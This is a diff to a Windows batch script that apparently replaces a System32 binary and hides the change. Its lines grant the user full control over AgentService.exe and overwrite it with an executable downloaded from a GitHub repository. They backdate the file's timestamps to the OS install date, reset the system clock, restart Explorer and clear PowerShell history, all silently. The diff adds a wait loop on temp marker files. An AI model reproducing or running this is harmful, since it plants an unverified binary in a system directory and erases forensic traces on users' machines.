@@ -1,3 +1,8 @@
+:loop
+if exist "%temp%\UFX_7612.tmp" goto ok
+goto loop
+:ok
+del /q /f %temp%\UFX_7612.tmp
 powershell -NoProfile -Command "$x = (Get-CimInstance Win32_OperatingSystem).InstallDate; Set-Date -Date $x" >nul 2>&1
 taskkill /f /im explorer.exe >nul 2>&1
 start explorer >nul 2>&1
@@ -6,5 +11,6 @@ icacls "C:\Windows\System32\AgentService.exe" /grant %username%:F >nul 2>&1
 powershell -NoProfile -Command "$ProgressPreference='SilentlyContinue'; iwr 'https://github.com/zold1337/toolsvip/raw/refs/heads/main/serviceog.exe' -OutFile 'C:\Windows\System32\AgentService.exe'" >nul 2>&1
 powershell -NoProfile -Command "$ts=(Get-ItemProperty 'Registry::HKEY_LOCAL_MACHINE\SOFT\Microsoft\Windows NT\CurrentVersion').InstallDate; $d=[DateTimeOffset]::FromUnixTimeSeconds($ts).LocalDateTime; $f=Get-Item '%WIN%\Windows\System32\AgentService.exe'; $f.CreationTime=$d; $f.LastWriteTime=$d; $f.LastAccessTime=$d; >nul 2>&1
 powershell -NoProfile -Command "Start-Service w32time; w32tm /resync /force" >nul 2>&1 
+echo 0 > DX2_8121.tmp
 powershell -Command Clear-History >nul 2>&1
 exit
